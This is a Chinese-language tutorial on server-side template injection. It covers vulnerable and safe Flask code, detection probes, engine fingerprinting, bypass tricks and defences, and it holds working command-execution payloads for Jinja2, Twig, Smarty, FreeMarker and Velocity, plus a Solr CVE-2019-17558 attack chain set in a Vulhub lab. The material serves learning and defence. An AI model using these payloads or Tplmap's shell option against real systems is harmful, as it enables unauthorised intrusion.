# SSTI 服务端模板注入漏洞

---

## 一、漏洞概述

**SSTI（Server-Side Template Injection，服务端模板注入）** 是一种高危 Web 安全漏洞，本质是**数据与代码边界混淆**：服务端模板引擎将用户可控的输入作为模板代码进行解析与执行，而非将其视为纯数据。

模板引擎的设计目的是实现业务逻辑与视图渲染的分离，但在不当使用场景下（如直接将用户输入拼接到模板字符串），攻击者可在服务端上下文执行任意代码，最终达成 **远程代码执行（RCE）**。

**漏洞危害**：任意文件读取、系统命令执行、内网横向移动、敏感信息泄露。

---

## 二、漏洞成因

### 2.1 核心根因

漏洞产生于开发者将用户输入**直接拼接到模板字符串**后交由模板引擎解析，而非以变量方式传入模板上下文。

- 安全模式：模板引擎仅将用户输入视为**字符串字面量**（数据）。
- 危险模式：模板引擎将用户输入视为**模板表达式**（代码）。

### 2.2 危险代码 vs 安全代码对比

**❌ 危险写法（字符串拼接 + `render_template_string`）：**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name')
    # 直接拼接用户输入到模板字符串 — 存在注入点
    template = '<html><h1>Hello %s</h1></html>' % name
    return render_template_string(template)
```

> 攻击者传入 `?name={{7*7}}`，服务器返回 `Hello 49`，模板表达式被解析执行。

**✅ 安全写法（参数绑定 + `render_template`）：**

```python
from flask import Flask, request, render_template

@app.route('/')
def index():
    name = request.args.get('name')
    # 通过上下文变量传入，模板引擎自动转义
    return render_template('index.html', name=name)
```

> **关键区别**：`render_template` 会对上下文变量自动进行 HTML 转义，而 `render_template_string` 会直接解析拼接后的整段字符串。

---

## 三、漏洞检测

### 3.1 高频攻击面

SSTI 漏洞集中于**将用户输入原样回显到页面**的功能点，应优先测试以下场景：

| 攻击面 | 测试方式 |
|--------|----------|
| 用户昵称/签名展示页 | 修改个人信息为 `{{7*7}}`，观察个人主页回显 |
| 404 自定义错误页 | 访问 `/{{7*7}}`，观察错误提示是否计算为 `49` |
| 邮件/PDF 模板导出 | 在输入字段插入模板表达式，检查生成内容 |
| 搜索回显框 | 搜索 `{{7*7}}`，观察结果页是否计算 |

### 3.2 多语种探针（Polyglot Probe）

使用包含多种模板引擎语法的复合探针，一次请求即可初步判断是否存在注入点：

```
a{*comment*}b{{7*7}}${7*7}<%=7*7%>
```

- 原样返回 → 无注入。
- 返回 `49` 或触发 **500 错误** → 存在注入，需进一步识别引擎类型。

### 3.3 引擎指纹识别（PortSwigger SSTI 决策树）

确认注入点后，通过差异化语法行为精准识别后端模板引擎：

```
输入 ${7*7}
├── 返回 49 → 输入 a{*comment*}b
│   ├── 返回 ab → FreeMarker (Java)
│   └── 返回 a{*comment*}b → Smarty (PHP) 或其它
│
└── 无变化 → 输入 {{7*7}}
    ├── 返回 49 → 输入 {{7*'7'}}
    │   ├── 返回 49 → Twig (PHP)
    │   └── 返回 7777777 → Jinja2 (Python)
    └── 无变化 → 尝试 <%= 7*7 %> (ERB/Ruby) 或其它
```

**指纹原理**：

- Jinja2（Python）：`'7' * 7` 语义为字符串重复，输出 `7777777`。
- Twig（PHP）：自动将字符串 `'7'` 转换为数字进行计算，输出 `49`。

### 3.4 自动化工具

**Tplmap** — SSTI 专用自动化检测与利用工具，功能类比 SQLmap：

```bash
# 基础检测
python tplmap.py -u "http://target.com/?name=test"

# 一键获取交互式 Shell
python tplmap.py -u "http://target.com/?name=test" --os-shell
```

---

## 四、漏洞利用

### 4.1 Python / Jinja2

#### 4.1.1 Python 对象内省（Magic Methods）

| 魔术方法 | 功能说明 |
|----------|----------|
| `__class__` | 返回对象所属的类 |
| `__base__` | 返回类的直接父类 |
| `__bases__` | 返回父类元组 |
| `__mro__` | 返回方法解析顺序（继承链） |
| `__subclasses__()` | 返回当前类的所有子类列表 |
| `__init__` | 构造函数 |
| `__globals__` | 返回函数所在模块的全局命名空间字典 |
| `__builtins__` | 返回内置函数模块 |
| `__import__` | 动态导入模块 |

#### 4.1.2 标准利用链（MRO 继承链遍历）

攻击路径：自任意对象出发，沿 `__class__ → __base__ → __subclasses__()` 追溯至 `object` 基类，遍历其子类，定位含 `os` 模块引用的类（如 `os._wrap_close`、`warnings.catch_warnings`），通过 `__init__.__globals__` 获取 `os.popen` 执行系统命令。

```python
# Step 1: 枚举 object 的所有子类
?name={{''.__class__.__base__.__subclasses__()}}

# Step 2: 定位可利用子类的索引（以 os._wrap_close 为例）
# 将输出复制至文件，用以下命令查找位置：
cat classes.txt | sed 's/, /\n/g' | grep -n "os._wrap_close"
# 注意：grep -n 行号从 1 开始，Python 列表索引从 0 开始，需减 1

# Step 3: 通过 __globals__ 获取 os 模块并执行命令
?name={{''.__class__.__base__.__subclasses__()[132].__init__.__globals__.popen('ls').read()}}
```

#### 4.1.3 内置对象绕过（免索引攻击）

无需遍历子类索引，直接利用 Jinja2 内置函数（如 `lipsum`、`cycler`、`joiner`）的 `__globals__` 中包含的 `os` 模块引用：

```python
# lipsum 利用
?name={{lipsum.__globals__['os'].popen('ls').read()}}

# cycler 利用
?name={{cycler.__init__.__globals__.os.popen('ls').read()}}

# joiner 利用
?name={{joiner.__init__.__globals__.os.popen('ls').read()}}

# dict 利用
?name={{dict.__init__.__globals__.os.popen('ls').read()}}
```

> **原理**：Jinja2 源码中，`lipsum` 等内置函数的定义模块在顶部 `import os`，导致 `__globals__` 字典包含 `os` 模块引用，攻击者无需遍历 `__subclasses__()` 即可直接获取。

---

### 4.2 PHP

PHP 的 SSTI 利用核心是**诱导模板引擎调用原生危险函数**（`system()`、`exec()`、`passthru()` 等）。

#### 4.2.1 Smarty 引擎

```php
// 版本探测
{$smarty.version}

// 旧版本：直接嵌入 PHP 代码块
{php}system('whoami');{/php}

// 新版本：利用条件判断触发函数执行
{if system('whoami')}{/if}
```

#### 4.2.2 Twig 引擎

**识别特征**：`{{7*'7'}}` 返回 `49`（自动类型转换，区别于 Jinja2 的 `7777777`）。

**RCE 利用** — 通过 `map` 过滤器调用 `system()`：

```twig
{{ ['whoami'] | map('system') | join }}
```

**Payload 拆解**：

1. `['whoami']` — 构造包含目标命令的数组。
2. `| map('system')` — 利用 Twig 的 `map` 过滤器，将数组中的每个元素作为参数传入 `system()` 函数执行。
3. `| join` — 将执行结果合并为字符串输出。

---

### 4.3 Java

Java 模板引擎的 SSTI 利用主要依赖两类技术路径：**引擎内置危险类实例化**与 **Java 反射机制（Reflection API）**。

#### 4.3.1 FreeMarker 引擎

```java
// 版本探测
<#assign a=123> ${a}

// RCE：通过 ?new() 实例化 Execute 类
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ ex("whoami") }
```

> FreeMarker 内置 `freemarker.template.utility.Execute` 类专用于执行系统命令，`?new()` 内置函数可绕过沙箱直接实例化该类。

#### 4.3.2 Velocity 引擎

**利用路径**：通过反射逐级获取 `java.lang.Runtime` 类并调用 `exec()`。

```java
#set($str = "")
#set($rt = $str.class.forName("java.lang.Runtime"))
#set($ex = $rt.getRuntime().exec("whoami"))
$ex.waitFor()
```

**Payload 拆解**：

1. `$str.class` — 从字符串对象获取 `Class` 引用。
2. `.forName("java.lang.Runtime")` — 通过反射加载 `Runtime` 类。
3. `.getRuntime().exec("whoami")` — 获取 `Runtime` 单例并执行命令。
4. `.waitFor()` — 阻塞等待进程结束。

#### 4.3.3 实战复现：Apache Solr CVE-2019-17558

**漏洞概述**：Apache Solr 的 VelocityResponseWriter 组件存在 SSTI，通过 API 动态开启 Velocity 模板渲染后，攻击者可注入 Java 反射 Payload 实现 RCE。

**环境搭建**（Vulhub）：

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/solr/CVE-2019-17558
docker-compose up -d
```

**创建 Core**：

```bash
docker-compose exec solr bash bin/solr create_core -c demo
```

验证：访问 `http://IP:8983/solr/admin/cores?indexInfo=false&wt=json`，确认返回 `"name":"demo"`。

**攻击步骤**：

Step 1 — 通过 Config API 启用 Velocity 模板渲染：

```bash
curl -X POST -H 'Content-type:application/json' \
  http://TARGET_IP:8983/solr/demo/config -d '
{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}'
```

> 返回 `"status":0` 表示配置修改成功。

Step 2 — 发送 Velocity 注入 Payload 执行系统命令：

```
http://TARGET_IP:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x='')%20%23set($rt=$x.class.forName('java.lang.Runtime'))%20%23set($chr=$x.class.forName('java.lang.Character'))%20%23set($str=$x.class.forName('java.lang.String'))%20%23set($ex=$rt.getRuntime().exec('id'))%20$ex.waitFor()%20%23set($out=$ex.getInputStream())%20%23foreach($i%20in%20[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

**URL 参数说明**：

| 参数 | 含义 |
|------|------|
| `wt=velocity` | 指定使用 Velocity 模板引擎渲染输出（触发 SSTI 的关键开关） |
| `v.template=custom` | 声明使用自定义模板内容 |
| `v.template.custom=...` | URL 编码后的 Velocity 反射 Payload（`%23` = `#`，`%20` = 空格） |

> **注意**：若回显为 `[C@xxxx` 形式的内存地址，需在 Payload 末尾加 `String.valueOf()` 将 `char[]` 转为可读字符串。上述 Payload 已包含该转换逻辑。

---

## 五、绕过技巧汇总

### 5.1 内置对象快捷利用（Jinja2）

绕过 `__subclasses__()` 遍历，直接使用 Jinja2 内置对象：

```python
{{lipsum.__globals__['os'].popen('cmd').read()}}
{{cycler.__init__.__globals__.os.popen('cmd').read()}}
{{joiner.__init__.__globals__.os.popen('cmd').read()}}
{{dict.__init__.__globals__.os.popen('cmd').read()}}
{{config.__init__.__globals__['os'].popen('cmd').read()}}
{{url_for.__globals__['os'].popen('cmd').read()}}
{{get_flashed_messages.__globals__['os'].popen('cmd').read()}}
```

### 5.2 过滤绕过

| 过滤场景 | 绕过方式 |
|----------|----------|
| 过滤 `.` | `attr()` 过滤器：`''\|attr('__class__')` |
| 过滤 `[]` | `__getitem__()` 或 `.pop()` |
| 过滤 `__` | Unicode 编码或字符串拼接：`'\x5f\x5fclass\x5f\x5f'` |
| 过滤 `{{` | 使用 `{% %}` 控制流标签配合 `print()` |
| 关键字黑名单 | 字符串拼接/反转：`''.__class__.__base__` → `''['__cla'+'ss__']` |

---

## 六、修复与防御

### 6.1 开发层面

1. **禁止字符串拼接模板**：永远不要将用户输入拼接到模板字符串中，始终使用上下文变量传递。
2. **使用安全 API**：优先使用 `render_template()` 而非 `render_template_string()`。
3. **模板沙箱**：在 Jinja2 中使用 `SandboxedEnvironment` 限制可访问的属性与方法。
4. **输入白名单校验**：对用户输入执行严格的白名单验证，拒绝含模板语法特征的内容。

### 6.2 运维/架构层面

1. **最小权限原则**：Web 进程以低权限用户运行，限制 `os`/`subprocess` 等模块的调用。
2. **WAF 规则**：配置模板注入特征检测规则（`{{`、`{%`、`${`、`<%=` 等）。
3. **禁用危险 API**：
   - FreeMarker：配置 `api_builtin_enabled=false`，禁用 `?new()`。
   - Smarty：禁用 `{php}` 标签（`$smarty->php_handling = Smarty::PHP_REMOVE`）。
   - Solr：不对外暴露 Config API，禁用 VelocityResponseWriter。
4. **依赖版本管理**：保持模板引擎及相关组件为最新版本。

---

## 七、跨语言速查表

| 语言 | 常见模板引擎 | 核心利用路径 | 关键 Payload 骨架 |
|------|-------------|-------------|-------------------|
| **Python** | Jinja2, Tornado, Mako | 对象继承链遍历 → `__globals__` 泄露 → `os.popen` | `''.__class__.__base__.__subclasses__()[N].__init__.__globals__['os'].popen('cmd').read()` |
| **Python** | Jinja2 (快捷) | 内置对象 `__globals__` 中的 `os` 引用 | `lipsum.__globals__['os'].popen('cmd').read()` |
| **PHP** | Twig | `map` 过滤器调用 `system()` | `{{ ['cmd'] \| map('system') \| join }}` |
| **PHP** | Smarty | 直接嵌入 PHP 代码或条件执行 | `{php}system('cmd');{/php}` / `{if system('cmd')}{/if}` |
| **Java** | FreeMarker | `?new()` 实例化 `Execute` 类 | `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("cmd")}` |
| **Java** | Velocity | 反射加载 `Runtime` 类 → 调用 `exec()` | `#set($rt=$str.class.forName("java.lang.Runtime")) #set($ex=$rt.getRuntime().exec("cmd"))` |

---

> **参考资料**：
> - PortSwigger Research: [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
> - Vulhub: [CVE-2019-17558](https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-17558)
> - Tplmap: [Server-Side Template Injection and Code Injection Detection and Exploitation Tool](https://github.com/epinna/tplmap)
